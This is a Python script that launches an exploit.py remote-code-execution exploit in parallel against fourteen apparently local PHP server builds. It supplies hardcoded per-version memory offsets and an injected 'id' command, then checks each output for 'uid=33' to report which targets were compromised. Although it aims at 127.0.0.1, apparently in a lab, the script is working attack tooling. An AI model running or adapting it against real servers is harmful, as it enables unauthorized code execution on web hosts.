import os
import subprocess, sys
BASE = os.path.dirname(os.path.abspath(__file__))
VERS = [
    ("p2s5445", "18101", "0x2f2e20", "0x3cd750"),
    ("p2s5538", "18102", "0x357e70", "0x438b80"),
    ("p2s5640", "18103", "0x378e80", "0x466920"),
    ("p2s7033", "18104", "0x3948d0", "0x47b7b0"),
    ("p2s7133", "18105", "0x300420", "0x3e6f60"),
    ("p2s7234", "18106", "0x3624e0", "0x451010"),
    ("p2s7333", "18107", "0x35f640", "0x440dc0"),
    ("p2s7433", "18108", "0x335850", "0x417d60"),
    ("p2s8030", "18109", "0x3495d0", "0x4319a0"),
    ("p2s8132", "18110", "0x36b080", "0x450690"),
    ("p2s8234", "18111", "0x39b8a0", "0x487650"),
    ("p2s8335", "18112", "0x3ac080", "0x49ec50"),
    ("p2s8426", "18113", "0x465370", "0x65eb60"),
    ("p2s8511", "18114", "0x5996e0", "0x7b47a0"),
]

def main():
    only = sys.argv[1:] if len(sys.argv) > 1 else None
    procs = []
    for c, port, zif, dtor in VERS:
        if only and c not in only:
            continue
        out = f"{BASE}\\{c}.rce.out"
        url = f"http://127.0.0.1:{port}/index.php"
        cmd = (f'python -u {BASE}\\exploit.py -u {url} --profile bookworm '
               f'--zif-offset {zif} --dtor-offset {dtor} -c "id>/www/p1" --fetch /p1')
        f = open(out, "w")
        p = subprocess.Popen(cmd, shell=True, stdout=f, stderr=subprocess.STDOUT)
        procs.append((c, port, p, out))
        print(f"launched {c} (port {port})")
    print(f"\n{len(procs)} exploits launched in parallel; waiting...")
    for c, port, p, out in procs:
        p.wait()
    print("\n" + "="*60)
    print("SUMMARY (RCE = uid=33 in output):")
    ok, no = [], []
    for c, port, p, out in procs:
        try:
            data = open(out, "r", errors="replace").read()
        except Exception:
            data = ""
        rce = "uid=33" in data
        (ok if rce else no).append(c)
        print(f"  {c:10s} port={port}  {'*** RCE ***' if rce else 'no RCE'}  rc={p.returncode}")
    print(f"\nRCE proven ({len(ok)}): {', '.join(ok)}")
    print(f"No RCE ({len(no)}): {', '.join(no)}")

if __name__ == "__main__":
    main()
